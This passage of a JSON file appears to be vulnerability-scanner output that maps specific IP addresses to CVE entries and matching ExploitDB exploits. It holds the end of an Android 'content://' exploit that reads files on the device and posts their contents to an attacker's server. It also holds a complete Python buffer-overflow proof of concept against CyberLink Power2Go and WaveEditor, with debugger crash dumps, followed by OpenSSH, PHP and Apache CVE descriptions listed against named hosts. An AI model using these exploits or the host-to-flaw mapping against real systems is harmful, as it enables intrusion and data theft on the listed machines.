addField(form, 'data'+i, filecontents[filename]);\r\n          i += 1;\r\n        }\r\n        document.body.appendChild(form);\r\n        form.submit();\r\n      }\r\n      getFiles(filenames);\r\n      uploadFiles(filecontents);\r\n    </script>\r\n  </body>\r\n</html>\r\n<?php\r\n}\r\n\r\n//  Stage 3:  Read the file names and contents sent by the payload and write to a file on the server.\r\nfunction stage3() {\r\n  $fp = fopen(\"files.txt\", \"w\") or die(\"Couldn't open file for writing!\");\r\n  fwrite($fp, print_r($_POST, TRUE)) or die(\"Couldn't write data to file!\"); \r\n  fclose($fp); \r\n  echo \"Data uploaded to <a href=\\\"files.txt\\\">files.txt</a>!\";\r\n}\r\n\r\n//  Select the stage to run depending on the parameter passed in the URL\r\nswitch($_GET[\"stage\"]) { \r\n  case \"1\": \r\n    stage1($scripturl); \r\n    break; \r\n  case \"2\": \r\n    stage2($scripturl,$filenames); \r\n    break; \r\n  case \"3\": \r\n    stage3(); \r\n    break;\r\n  default: \r\n    stage0($scripturl); \r\n    break; \r\n} \r\n?>",
                "description": "Google Android - 'content://' URI Multiple Information Disclosure Vulnerabilities",
                "author": "Thomas Cannon",
                "_id": 18164,
                "source": "ExploitDB",
                "platform": "android",
                "date": "2011-11-28T00:00:00+00:00",
                "cve": [
                    "CVE-2010-4804"
                ],
                "type": "webapps",
                "port": 0
            },
            {
                "code": "#!/usr/bin/python\r\n# \r\n# Exploit Title: CyberLink Multiple Products File Project Handling Stack Buffer Overflow POC\r\n# by: modpr0be[at]spentera[dot]com (@modpr0be)\r\n# Platform: Windows\r\n# Tested on: Windows XP SP3, Windows 7 SP1 with:\r\n# \tCyberLink Power2Go 7 (build 196)\r\n# \tCyberLink Power2Go 8 (build 1031)\r\n# \tCyberLink WaveEditor 2.0 (build 2204)\r\n# Software Link: http://www.cyberlink.com/downloads/trials/index_en_US.html\r\n# CVE : -\r\n\r\n### Software Description\r\n# CyberLink Power2Go is all-media disc burning software. \r\n# Copy all your media to any disc with Power2Go 8! With new System Recovery tools \r\n# and over 5000 free DVD menus to choose from on DirectorZone.com, Power2Go 8 not \r\n# only burns everything but allows you to create pro-like DVDs, rip CDs and \r\n# safeguard valuable data. \r\n\r\n# CyberLink Wave Editor will help user to convert audio format when producing, editing, \r\n# or creating backups for some audios or videos. This additional tools is also included \r\n# since PowerDirector 9 to PowerDirector 10, and now included on Power2Go 8.\r\n\r\n### Vulnerability Details\r\n# Most of CyberLink products contain built-in project file with their own format and\r\n# extension. This file usually contains our recently modified project or work.\r\n# Most of this filetypes contain this section:\r\n#     <File src=\r\n#     <File name=\r\n# Generally, those sections will be filled with source path or filename. \r\n# both products will lead us to command execution because the address of \r\n# SE Handler is overwritten with 0x00410041.\r\n\r\n# Notes:\r\n# I cannot find any good return address for WaveEditor, if you can make it\r\n# through the hard way, kudos!!\r\n\r\n### Vendor logs:\r\n# 10/10/2011 - Bug found\r\n# 10/11/2011 - Vendor contacted\r\n# 10/11/2011 - Vendor replied and requested POC\r\n# 10/11/2011 - POC sent to vendor\r\n# 10/31/2011 - Vendor said the POC will be researched\r\n# 10/27/2011 - Submitted to CERT\r\n# 11/09/2011 - CyberLink updated the product\r\n# 11/09/2011 - POC still works on the latest version\r\n# 12/09/2011 - No response from vendor, POC release.\r\n\r\nimport time,sys\r\n\r\ndef power2go():\r\n\t# header for power2go\r\n\theader = (\r\n\t\"\\x3c\\x50\\x72\\x6f\\x6a\\x65\\x63\\x74\\x20\\x6d\\x61\\x67\\x69\\x63\"\r\n\t\"\\x3d\\x22\\x69\\x6e\\x73\\x65\\x63\\x75\\x72\\x69\\x74\\x79\\x22\\x20\"\r\n\t\"\\x76\\x65\\x72\\x73\\x69\\x6f\\x6e\\x3d\\x22\\x31\\x30\\x31\\x22\\x3e\"\r\n\t\"\\x0d\\x0a\\x3c\\x49\\x6e\\x66\\x6f\\x72\\x6d\\x61\\x74\\x69\\x6f\\x6e\"\r\n\t\"\\x2f\\x3e\\x0d\\x0a\\x3c\\x43\\x6f\\x6d\\x70\\x69\\x6c\\x61\\x74\\x69\"\r\n\t\"\\x6f\\x6e\\x3e\\x0d\\x0a\\x3c\\x44\\x61\\x74\\x61\\x44\\x69\\x73\\x63\"\r\n\t\"\\x20\\x0d\\x0a\\x64\\x69\\x73\\x63\\x4e\\x61\\x6d\\x65\\x3d\\x22\\x49\"\r\n\t\"\\x4e\\x53\\x45\\x43\\x55\\x52\\x49\\x54\\x59\\x22\\x20\\x0d\\x0a\\x66\"\r\n\t\"\\x69\\x6c\\x65\\x44\\x61\\x74\\x65\\x3d\\x22\\x6f\\x72\\x69\\x67\\x69\"\r\n\t\"\\x6e\\x61\\x6c\\x22\\x20\\x66\\x69\\x6c\\x65\\x54\\x69\\x6d\\x65\\x3d\"\r\n\t\"\\x22\\x30\\x22\\x20\\x0d\\x0a\\x64\\x69\\x73\\x63\\x54\\x79\\x70\\x65\"\r\n\t\"\\x3d\\x22\\x63\\x64\\x22\\x20\\x0d\\x0a\\x73\\x65\\x73\\x73\\x69\\x6f\"\r\n\t\"\\x6e\\x53\\x69\\x7a\\x65\\x3d\\x22\\x30\\x22\\x20\\x0d\\x0a\\x50\\x4f\"\r\n\t\"\\x57\\x42\\x75\\x72\\x6e\\x65\\x64\\x53\\x69\\x7a\\x65\\x3d\\x22\\x30\"\r\n\t\"\\x22\\x20\\x0d\\x0a\\x53\\x65\\x63\\x75\\x72\\x65\\x64\\x44\\x61\\x74\"\r\n\t\"\\x61\\x3d\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x57\\x68\"\r\n\t\"\\x6f\\x6c\\x65\\x53\\x65\\x63\\x75\\x72\\x65\\x64\\x44\\x61\\x74\\x61\"\r\n\t\"\\x3d\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x53\\x65\\x63\"\r\n\t\"\\x75\\x72\\x69\\x74\\x79\\x4b\\x65\\x79\\x53\\x69\\x7a\\x65\\x3d\\x22\"\r\n\t\"\\x31\\x36\\x22\\x20\\x0d\\x0a\\x48\\x69\\x64\\x65\\x46\\x69\\x6c\\x65\"\r\n\t\"\\x4e\\x61\\x6d\\x65\\x3d\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\"\r\n\t\"\\x0a\\x62\\x6f\\x6f\\x74\\x61\\x62\\x6c\\x65\\x3d\\x22\\x66\\x61\\x6c\"\r\n\t\"\\x73\\x65\\x22\\x20\\x0d\\x0a\\x62\\x6f\\x6f\\x74\\x46\\x6c\\x6f\\x70\"\r\n\t\"\\x70\\x79\\x3d\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x62\"\r\n\t\"\\x6f\\x6f\\x74\\x49\\x6d\\x61\\x67\\x65\\x3d\\x22\\x22\\x20\\x0d\\x0a\"\r\n\t\"\\x61\\x75\\x74\\x6f\\x52\\x75\\x6e\\x45\\x78\\x65\\x3d\\x22\\x66\\x61\"\r\n\t\"\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x61\\x75\\x74\\x6f\\x52\\x75\\x6e\"\r\n\t\"\\x45\\x78\\x65\\x50\\x61\\x74\\x68\\x3d\\x22\\x22\\x20\\x0d\\x0a\\x61\"\r\n\t\"\\x75\\x74\\x6f\\x52\\x75\\x6e\\x49\\x63\\x6f\\x6e\\x3d\\x22\\x66\\x61\"\r\n\t\"\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x61\\x75\\x74\\x6f\\x52\\x75\\x6e\"\r\n\t\"\\x49\\x63\\x6f\\x6e\\x50\\x61\\x74\\x68\\x3d\\x22\\x22\\x20\\x0d\\x0a\"\r\n\t\"\\x41\\x75\\x74\\x6f\\x53\\x70\\x6c\\x69\\x74\\x44\\x69\\x73\\x63\\x3d\"\r\n\t\"\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x44\\x69\\x73\\x63\"\r\n\t\"\\x53\\x70\\x6c\\x69\\x74\\x3d\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\"\r\n\t\"\\x0d\\x0a\\x41\\x75\\x74\\x6f\\x4f\\x76\\x65\\x72\\x42\\x75\\x72\\x6e\"\r\n\t\"\\x3d\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x44\\x61\\x74\"\r\n\t\"\\x61\\x50\\x72\\x6a\\x74\\x6f\\x56\\x69\\x64\\x65\\x6f\\x50\\x72\\x6a\"\r\n\t\"\\x3d\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x73\\x69\\x6d\"\r\n\t\"\\x75\\x6c\\x61\\x74\\x69\\x6f\\x6e\\x3d\\x22\\x66\\x61\\x6c\\x73\\x65\"\r\n\t\"\\x22\\x20\\x0d\\x0a\\x62\\x75\\x72\\x6e\\x50\\x72\\x6f\\x6f\\x66\\x3d\"\r\n\t\"\\x22\\x74\\x72\\x75\\x65\\x22\\x20\\x0d\\x0a\\x63\\x6c\\x6f\\x73\\x65\"\r\n\t\"\\x44\\x69\\x73\\x63\\x3d\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\"\r\n\t\"\\x0a\\x76\\x65\\x72\\x69\\x66\\x79\\x44\\x69\\x73\\x63\\x3d\\x22\\x66\"\r\n\t\"\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x64\\x65\\x66\\x65\\x63\\x74\"\r\n\t\"\\x6d\\x61\\x6e\\x61\\x67\\x65\\x6d\\x65\\x6e\\x74\\x3d\\x22\\x66\\x61\"\r\n\t\"\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x63\\x6f\\x70\\x69\\x65\\x73\\x3d\"\r\n\t\"\\x22\\x31\\x22\\x20\\x0d\\x0a\\x62\\x75\\x72\\x6e\\x53\\x70\\x65\\x65\"\r\n\t\"\\x64\\x3d\\x22\\x30\\x22\\x20\\x0d\\x0a\\x63\\x64\\x54\\x65\\x78\\x74\"\r\n\t\"\\x3d\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x41\\x75\\x64\"\r\n\t\"\\x69\\x6f\\x4e\\x6f\\x72\\x6d\\x61\\x6c\\x69\\x7a\\x65\\x3d\\x22\\x66\"\r\n\t\"\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x41\\x75\\x64\\x69\\x6f\\x47\"\r\n\t\"\\x61\\x70\\x54\\x69\\x6d\\x65\\x3d\\x22\\x32\\x22\\x20\\x0d\\x0a\\x46\"\r\n\t\"\\x69\\x6c\\x65\\x53\\x79\\x73\\x74\\x65\\x6d\\x3d\\x22\\x49\\x53\\x4f\"\r\n\t\"\\x39\\x36\\x36\\x30\\x5f\\x4a\\x4f\\x4c\\x49\\x45\\x54\\x22\\x3e\")\r\n\r\n\tbody = (\r\n\t\"\\x73\\x72\\x63\\x3d\\x22\\x43\\x3a\\x5c\\x61\\x62\\x63\\x2e\\x74\\x78\"\r\n\t\"\\x74\\x22\\x20\\x0d\\x0a\\x6f\\x70\\x65\\x72\\x61\\x74\\x69\\x6f\\x6e\"\r\n\t\"\\x3d\\x22\\x61\\x64\\x64\\x22\\x20\\x0d\\x0a\\x62\\x75\\x72\\x6e\\x73\"\r\n\t\"\\x74\\x61\\x74\\x75\\x73\\x3d\\x22\\x6e\\x6f\\x74\\x62\\x75\\x72\\x6e\"\r\n\t\"\\x22\\x20\\x0d\\x0a\\x73\\x69\\x7a\\x65\\x3d\\x22\\x32\\x39\\x32\\x38\"\r\n\t\"\\x36\\x34\\x22\\x20\\x0d\\x0a\\x53\\x68\\x6f\\x77\\x53\\x69\\x7a\\x65\"\r\n\t\"\\x3d\\x22\\x32\\x39\\x32\\x38\\x36\\x34\\x22\\x20\\x0d\\x0a\\x41\\x6c\"\r\n\t\"\\x6c\\x6f\\x77\\x45\\x6e\\x63\\x72\\x79\\x70\\x74\\x3d\\x22\\x66\\x61\"\r\n\t\"\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x53\\x65\\x63\\x75\\x72\\x65\\x64\"\r\n\t\"\\x52\\x6f\\x6f\\x74\\x3d\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\"\r\n\t\"\\x0a\\x66\\x69\\x6c\\x65\\x54\\x69\\x6d\\x65\\x3d\\x22\\x31\\x32\\x39\"\r\n\t\"\\x33\\x36\\x37\\x33\\x34\\x31\\x35\\x30\\x39\\x37\\x33\\x36\\x38\\x37\"\r\n\t\"\\x34\\x22\\x20\\x0d\\x0a\\x6f\\x6c\\x64\\x3d\\x22\\x66\\x61\\x6c\\x73\"\r\n\t\"\\x65\\x22\\x20\\x0d\\x0a\\x74\\x65\\x6d\\x70\\x66\\x69\\x6c\\x65\\x3d\"\r\n\t\"\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x74\\x65\\x6d\\x70\"\r\n\t\"\\x64\\x69\\x72\\x6c\\x65\\x76\\x65\\x6c\\x3d\\x22\\x30\\x22\\x20\\x0d\"\r\n\t\"\\x0a\\x66\\x6f\\x72\\x61\\x75\\x64\\x69\\x6f\\x74\\x72\\x61\\x63\\x6b\"\r\n\t\"\\x3d\\x22\\x66\\x61\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x74\\x61\\x72\"\r\n\t\"\\x67\\x65\\x74\\x41\\x75\\x64\\x69\\x6f\\x43\\x44\\x3d\\x22\\x66\\x61\"\r\n\t\"\\x6c\\x73\\x65\\x22\\x20\\x0d\\x0a\\x64\\x61\\x74\\x61\\x69\\x74\\x65\"\r\n\t\"\\x6d\\x74\\x79\\x70\\x65\\x3d\\x22\\x30\\x22\\x20\\x0d\\x0a\\x6d\\x76\"\r\n\t\"\\x70\\x3d\\x22\\x30\\x22\\x20\\x0d\\x0a\\x61\\x75\\x64\\x69\\x6f\\x53\"\r\n\t\"\\x75\\x62\\x74\\x79\\x70\\x65\\x3d\\x22\\x30\\x22\\x2f\\x3e\\x0d\\x0a\"\r\n\t\"\\x3c\\x2f\\x44\\x61\\x74\\x61\\x44\\x69\\x73\\x63\\x3e\\x0d\\x0a\\x3c\"\r\n\t\"\\x2f\\x43\\x6f\\x6d\\x70\\x69\\x6c\\x61\\x74\\x69\\x6f\\x6e\\x3e\\x0d\"\r\n\t\"\\x0a\\x3c\\x2f\\x50\\x72\\x6f\\x6a\\x65\\x63\\x74\\x3e\")\r\n\r\n\tpgfile = \"overflow.p2g\"\r\n\tf = open(pgfile,'w')\r\n\tjunk = \"A\" * 778\r\n\tnseh = \"\\x42\\x42\"\r\n\tseh = \"\\x43\\x43\"\r\n\tsisa =  \"\\x44\" * 4200\r\n\r\n\thell = \"\\x3c\\x46\\x69\\x6c\\x65\" + \"\\r\\n\"\t# <File\r\n\thell+= \"name=\" + '\"'+ junk+nseh+seh+sisa + '\"'\r\n\ttry:\r\n\t\tf.write(header+ \"\\r\\n\" + hell + \"\\r\\n\" + body)\r\n\t\tprint \"[!] Generating\", pgfile, \"..\"\r\n\t\ttime.sleep(1)\r\n\t\tprint \"[+] File\", pgfile, \"successfully created!\"\r\n\t\tprint \"[*] Now open project file\" +\" \\'\"+pgfile+\"\\' \" + \"with CyberLink Power2Go.\"\r\n\t\tprint \"[*] Good luck ;)\"\r\n\t\tf.close()\r\n\texcept IOError:\r\n\t\tprint \"[-] Could not write to destination folder, check permission..\"\r\n\t\tsys.exit()\r\n\r\ndef waveeditor():\r\n\theader = (\"\\x3c\\x50\\x72\\x6f\\x6a\\x65\\x63\\x74\\x20\\x41\\x70\\x70\\x6c\\x69\\x63\\x61\"\r\n\t\"\\x74\\x69\\x6f\\x6e\\x3d\\x22\\x57\\x61\\x76\\x65\\x45\\x64\\x69\\x74\\x6f\\x72\\x22\\x20\"\r\n\t\"\\x56\\x65\\x72\\x73\\x69\\x6f\\x6e\\x3d\\x22\\x32\\x2e\\x30\\x22\\x3e\")\r\n\r\n\twvefile = \"overflow.wve\"\r\n\tf = open(wvefile,'w')\r\n\tjunk = \"A\" * 3000\r\n\r\n\thell = \"\\x3c\\x46\\x69\\x6c\\x65\\x20\\x53\\x72\\x63\\x3d\" # <File src=\r\n\thell += '\"'+ junk + '\"' + \"\\x3e\"\r\n\r\n\tfill = (\"\\x3c\\x42\\x6f\\x6f\\x6b\\x6d\\x61\\x72\\x6b\\x4c\\x69\\x73\\x74\\x2f\\x3e\\x3c\"\r\n\t\"\\x2f\\x46\\x69\\x6c\\x65\\x3e\\x3c\\x2f\\x50\\x72\\x6f\\x6a\\x65\\x63\\x74\\x3e\")\r\n\t\r\n\tfill = (\"\\x3c\\x42\\x6f\\x6f\\x6b\\x6d\\x61\\x72\\x6b\\x4c\\x69\\x73\\x74\\x2f\\x3e\\x3c\"\r\n\t\"\\x2f\\x46\\x69\\x6c\\x65\\x3e\\x3c\\x43\\x6f\\x6d\\x70\\x69\\x6c\\x61\\x74\\x69\\x6f\\x6e\"\r\n\t\"\\x3e\\x3c\\x41\\x75\\x64\\x69\\x6f\\x43\\x44\\x20\\x62\\x75\\x72\\x6e\\x50\\x72\\x6f\\x6f\"\r\n\t\"\\x66\\x3d\\x22\\x74\\x72\\x75\\x65\\x22\\x20\\x63\\x6f\\x70\\x69\\x65\\x73\\x3d\\x22\\x30\"\r\n\t\"\\x22\\x20\\x62\\x75\\x72\\x6e\\x53\\x70\\x65\\x65\\x64\\x3d\\x22\\x30\\x22\\x20\\x41\\x75\"\r\n\t\"\\x64\\x69\\x6f\\x4e\\x6f\\x72\\x6d\\x61\\x6c\\x69\\x7a\\x65\\x3d\\x22\\x66\\x61\\x6c\\x73\"\r\n\t\"\\x65\\x22\\x20\\x41\\x75\\x64\\x69\\x6f\\x47\\x61\\x70\\x54\\x69\\x6d\\x65\\x3d\\x22\\x32\"\r\n\t\"\\x22\\x2f\\x3e\\x3c\\x2f\\x43\\x6f\\x6d\\x70\\x69\\x6c\\x61\\x74\\x69\\x6f\\x6e\\x3e\\x3c\"\r\n\t\"\\x2f\\x50\\x72\\x6f\\x6a\\x65\\x63\\x74\\x3e\")\r\n\t\r\n\ttry:\r\n\t\tf.write(header+hell+fill)\r\n\t\tprint \"[!] Generating\", wvefile, \"..\"\r\n\t\ttime.sleep(1)\r\n\t\tprint \"[+] File\", wvefile, \"successfully created!\"\r\n\t\tprint \"[*] Now open project file\" +\" \\'\"+wvefile+\"\\' \" + \"with CyberLink WaveEditor.\"\r\n\t\tprint \"[*] Good luck ;)\"\r\n\t\tf.close()\r\n\texcept IOError:\r\n\t\tprint \"[-] Could not write to destination folder, check permission..\"\r\n\t\tsys.exit()\r\n\r\nprint \"[*] CyberLink Multiple Products File Project Processing Stack Buffer Overflow POC.\"\r\nprint \"[*] by modpr0be <modpr0be[at]spentera[dot]com> | @modpr0be\"\r\nprint \"\\t1.CyberLink Power2Go <= 8.0\"\r\nprint \"\\t2.CyberLink WaveEditor <= 2.0\"\r\n\r\na = 0\r\nwhile a < 2:\r\n\ta = a + 1\r\n\top = input (\"[!] Choose the product: \")\r\n\tif op == 1:\r\n\t\tpower2go()\r\n\t\tsys.exit()\r\n\telif op == 2:\r\n\t\twaveeditor()\r\n\t\tsys.exit()\r\n\telse:\r\n\t\tprint \"[-] Oh plz.. pick the right one :)\\r\\n\"\r\n\r\n\r\n### DUMP OF POWER2GO\r\n#(d18.c60): Break instruction exception - code 80000003 (first chance)\r\n#eax=7ffde000 ebx=00000001 ecx=00000002 edx=00000003 esi=00000004 edi=00000005\r\n#eip=7c90120e esp=07d4ffcc ebp=07d4fff4 iopl=0         nv up ei pl zr na pe nc\r\n#cs=001b  ss=0023  ds=0023  es=0023  fs=0038  gs=0000             efl=00000246\r\n#ntdll!DbgBreakPoint:\r\n#7c90120e cc              int     3\r\n#Missing image name, possible paged-out or corrupt data.\r\n#Missing image name, possible paged-out or corrupt data.\r\n#0:022> g\r\n#(d18.d40): Access violation - code c0000005 (first chance)\r\n#First chance exceptions are reported before any exception handling.\r\n#This exception may be expected and handled.\r\n#eax=ec8b55ff ebx=010358b0 ecx=78ad8951 edx=005b12fc esi=00430043 edi=0012d69c\r\n#eip=ec8b55ff esp=0012ca70 ebp=00000000 iopl=0         nv up ei pl zr na pe nc\r\n#cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246\r\n#ec8b55ff ??              ???\r\n#*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\\Program Files\\CyberLink\\Power2Go8\\Power2Go8.exe - \r\n#0:000> !exchain\r\n#0012ca9c: Power2Go8!CCLAuMixerAPI::operator=+156ba8 (00560dc8)\r\n#0012d104: Power2Go8!CCLAuMixerAPI::operator=+25e23 (00430043)\r\n#Invalid exception stack at 00420042\r\n#0:000> d 0012d104\r\n#0012d104  42 00 42 00 43 00 43 00-43 00 43 00 43 00 43 00  B.B.C.C.C.C.C.C.\r\n#0012d114  43 00 43 00 43 00 43 00-43 00 43 00 43 00 43 00  C.C.C.C.C.C.C.C.\r\n#0012d124  43 00 43 00 43 00 43 00-43 00 43 00 43 00 43 00  C.C.C.C.C.C.C.C.\r\n#0012d134  43 00 43 00 43 00 43 00-43 00 43 00 43 00 43 00  C.C.C.C.C.C.C.C.\r\n#0012d144  43 00 43 00 43 00 43 00-43 00 43 00 43 00 43 00  C.C.C.C.C.C.C.C.\r\n#0012d154  43 00 43 00 43 00 43 00-43 00 43 00 43 00 43 00  C.C.C.C.C.C.C.C.\r\n#0012d164  43 00 43 00 43 00 43 00-43 00 43 00 43 00 43 00  C.C.C.C.C.C.C.C.\r\n#0012d174  43 00 43 00 43 00 43 00-43 00 43 00 43 00 43 00  C.C.C.C.C.C.C.C.\r\n\r\n\r\n### DUMP OF WAVE EDITOR\r\n#(e44.734): Break instruction exception - code 80000003 (first chance)\r\n#eax=7ffd9000 ebx=00000001 ecx=00000002 edx=00000003 esi=00000004 edi=00000005\r\n#eip=7c90120e esp=00e5ffcc ebp=00e5fff4 iopl=0         nv up ei pl zr na pe nc\r\n#cs=001b  ss=0023  ds=0023  es=0023  fs=0038  gs=0000             efl=00000246\r\n#ntdll!DbgBreakPoint:\r\n#7c90120e cc              int     3\r\n#Missing image name, possible paged-out or corrupt data.\r\n#Missing image name, possible paged-out or corrupt data.\r\n#0:016> g\r\n#(e44.e48): Access violation - code c0000005 (first chance)\r\n#First chance exceptions are reported before any exception handling.\r\n#This exception may be expected and handled.\r\n#eax=00410041 ebx=ffffffff ecx=0240868b edx=420b1802 esi=022ccbe8 edi=00d2f848\r\n#eip=024c47af esp=0012c424 ebp=0012c42c iopl=0         nv up ei pl nz na pe nc\r\n#cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210206\r\n#*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\\Program Files\\CyberLink\\WaveEditor\\WaveKernel.dll -\r\n#WaveKernel!ReleaseWaveKernelClient+0x12a8f:\r\n#024c47af 8b4208          mov     eax,dword ptr [edx+8] ds:0023:420b180a=????????\r\n#Missing image name, possible paged-out or corrupt data.\r\n#Missing image name, possible paged-out or corrupt data.\r\n#0:000> !exchain\r\n#0012c898: *** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\\Program Files\\CyberLink\\WaveEditor\\WaveEditor.exe -\r\n#WaveEditor!CCLAuMixerAPI::CCLAuMixerAPI+da61 (00410041)\r\n#Invalid exception stack at 00410041\r\n#0:000> d 0012c898\r\n#0012c898  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.\r\n#0012c8a8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.\r\n#0012c8b8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.\r\n#0012c8c8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.\r\n#0012c8d8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.\r\n#0012c8e8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.\r\n#0012c8f8  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.\r\n#0012c908  41 00 41 00 41 00 41 00-41 00 41 00 41 00 41 00  A.A.A.A.A.A.A.A.\r\n#",
                "description": "CyberLink (Multiple Products) - File Project Handling Stack Buffer Overflow (PoC)",
                "author": "modpr0be",
                "_id": 18220,
                "source": "ExploitDB",
                "platform": "windows",
                "date": "2011-12-09T00:00:00+00:00",
                "cve": [],
                "type": "dos",
                "port": 0
            }
        ],
        "CVE-2017-15906": [
            {
                "source": "CVE",
                "_id": "2017-15906",
                "description": "The process_open function in sftp-server.c in OpenSSH before 7.6 does not properly prevent write operations in readonly mode, which allows attackers to create zero-length files.",
                "osvdb": [],
                "bid": [
                    101552
                ],
                "cve": [
                    "CVE-2017-15906"
                ],
                "msb": []
            }
        ],
        "CVE-2014-1692": [
            {
                "source": "CVE",
                "_id": "2014-1692",
                "description": "The hash_buffer function in schnorr.c in OpenSSH through 6.4, when Makefile.inc is modified to enable the J-PAKE protocol, does not initialize certain data structures, which might allow remote attackers to cause a denial of service (memory corruption) or have unspecified other impact via vectors that trigger an error condition.",
                "osvdb": [
                    102611
                ],
                "bid": [
                    65230
                ],
                "cve": [
                    "CVE-2014-1692"
                ],
                "msb": []
            }
        ]
    },
    "152.14.133.196": {
        "CVE-2018-15919": [
            {
                "source": "CVE",
                "_id": "2018-15919",
                "description": "Remotely observable behaviour in auth-gss2.c in OpenSSH through 7.8 could be used by remote attackers to detect existence of users on a target system when GSS2 is in use. NOTE: the discoverer states 'We understand that the OpenSSH developers do not want to treat such a username enumeration (or \"oracle\") as a vulnerability.'",
                "osvdb": [],
                "bid": [
                    105163
                ],
                "cve": [
                    "CVE-2018-15919"
                ],
                "msb": []
            }
        ]
    },
    "152.14.136.8": {},
    "152.14.136.24": {
        "CVE-2020-7060": []
    },
    "152.14.136.47": {
        "CVE-2018-19935": [
            {
                "source": "CVE",
                "_id": "2018-19935",
                "description": "ext/imap/php_imap.c in PHP 5.x and 7.x before 7.3.0 allows remote attackers to cause a denial of service (NULL pointer dereference and application crash) via an empty string in the message argument to the imap_mail function.",
                "osvdb": [],
                "bid": [
                    106143
                ],
                "cve": [
                    "CVE-2018-19935"
                ],
                "msb": []
            }
        ]
    },
    "152.14.136.58": {
        "CVE-2018-15919": [
            {
                "source": "CVE",
                "_id": "2018-15919",
                "description": "Remotely observable behaviour in auth-gss2.c in OpenSSH through 7.8 could be used by remote attackers to detect existence of users on a target system when GSS2 is in use. NOTE: the discoverer states 'We understand that the OpenSSH developers do not want to treat such a username enumeration (or \"oracle\") as a vulnerability.'",
                "osvdb": [],
                "bid": [
                    105163
                ],
                "cve": [
                    "CVE-2018-15919"
                ],
                "msb": []
            }
        ],
        "CVE-2017-15906": [
            {
                "source": "CVE",
                "_id": "2017-15906",
                "description": "The process_open function in sftp-server.c in OpenSSH before 7.6 does not properly prevent write operations in readonly mode, which allows attackers to create zero-length files.",
                "osvdb": [],
                "bid": [
                    101552
                ],
                "cve": [
                    "CVE-2017-15906"
                ],
                "msb": []
            }
        ]
    },
    "152.14.136.85": {
        "CVE-2018-10549": [
            {
                "source": "CVE",
                "_id": "2018-10549",
                "description": "An issue was discovered in PHP before 5.6.36, 7.0.x before 7.0.30, 7.1.x before 7.1.17, and 7.2.x before 7.2.5. exif_read_data in ext/exif/exif.c has an out-of-bounds read for crafted JPEG data because exif_iif_add_value mishandles the case of a MakerNote that lacks a final '\\0' character.",
                "osvdb": [],
                "bid": [
                    104019
                ],
                "cve": [
                    "CVE-2018-10549"
                ],
                "msb": []
            }
        ],
        "CVE-2018-10548": [
            {
                "source": "CVE",
                "_id": "2018-10548",
                "description": "An issue was discovered in PHP before 5.6.36, 7.0.x before 7.0.30, 7.1.x before 7.1.17, and 7.2.x before 7.2.5. ext/ldap/ldap.c allows remote LDAP servers to cause a denial of service (NULL pointer dereference and application crash) because of mishandling of the ldap_get_dn return value.",
                "osvdb": [],
                "bid": [
                    104019
                ],
                "cve": [
                    "CVE-2018-10548"
                ],
                "msb": []
            }
        ]
    },
    "152.14.136.88": {
        "CVE-2018-15919": [
            {
                "source": "CVE",
                "_id": "2018-15919",
                "description": "Remotely observable behaviour in auth-gss2.c in OpenSSH through 7.8 could be used by remote attackers to detect existence of users on a target system when GSS2 is in use. NOTE: the discoverer states 'We understand that the OpenSSH developers do not want to treat such a username enumeration (or \"oracle\") as a vulnerability.'",
                "osvdb": [],
                "bid": [
                    105163
                ],
                "cve": [
                    "CVE-2018-15919"
                ],
                "msb": []
            }
        ]
    },
    "152.14.136.94": {
        "CVE-2014-0117": [
            {
                "source": "CVE",
                "_id": "2014-0117",
                "description": "The mod_proxy module in the Apache HTTP Server 2.4.x before 2.4.10, when a reverse proxy is enabled, allows remote attackers to cause a denial of service (child-process crash) via a crafted HTTP Connection header.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2014-0117"
                ],
                "msb": []
            }
        ]
    },
    "152.14.136.135": {
        "CVE-2014-0117": [
            {
                "source": "CVE",
                "_id": "2014-0117",
                "description": "The mod_proxy module in the Apache HTTP Server 2.4.x before 2.4.10, when a reverse proxy is enabled, allows remote attackers to cause a denial of service (child-process crash) via a crafted HTTP Connection header.",
                "osvdb": [],
                "bid": [],
                "cve": [
                    "CVE-2014-0117"
                ],
                "msb": []
            }
        ],
        "CVE-2014-0118": [
            {
                "source": "CVE",
                "_id": "2014-0118",
